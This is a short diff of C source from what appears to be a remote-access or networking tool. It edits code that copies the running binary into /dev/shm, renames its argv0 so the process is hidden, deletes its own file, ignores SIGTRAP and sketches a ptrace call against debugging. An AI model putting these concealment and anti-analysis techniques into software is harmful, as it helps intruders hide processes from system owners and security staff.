@@ -105,7 +105,7 @@ try_cpexecme(char *exename, char *argv[]) {
 	unlink(fn);
 
 	goto err;
-	ret = 0;
+	ret = 0; // CAN NOT HAPPEN
 err:
 	XCLOSE(src);
 	XCLOSE(dst);
@@ -249,6 +249,16 @@ ok:
 // 	getline(&ptr, &sz, stdin);
 // }
 
+// STOP ptrace() of my self.
+// - FIXME: Ulg. Any signal to this process (like TERM or SIG_CHLD) will stop this process,
+//   This would make it non-functional.
+// static void
+// try_ptraceme(void) {
+// #ifdef HAVE_SYS_PTRACE_H
+// 	ptrace(PTRACE_TRACEME, 0, 0, 0); // -EPERM ==> already traced.
+// #endif
+// }
+
 static void
 try_changeargv0(int argc, char *argv[]) {
 	char *exename;
@@ -295,6 +305,8 @@ try_changeargv0(int argc, char *argv[]) {
 		gopt.prg_exename = strdup(ptr);
 		DEBUGF("Now hidden as ARGV0=%s [EXENAME=%s]\n", argv[0], gopt.prg_exename);
 		unsetenv("_GS_PROC_EXENAME");
+		// try_ptraceme();
+		signal(SIGTRAP, SIG_IGN);
 		GSNC_config_read(gopt.prg_exename);
 		if ((ptr = getenv("_GS_DELME"))) {
 			unlink(ptr);
@@ -343,7 +355,7 @@ try_changeargv0(int argc, char *argv[]) {
 
 	// First try to copy & execute myself as /dev/shm/PROC_HIDDENNAME
 	if (try_cpexecme(exename, argv) == 0)
-		return;
+		exit(255); // CAN NOT HAPPEN
 
 	// No point to change argv0 is started via ld-linux because it will show binary as argv1 anyway.
 	if (ldso == NULL) {
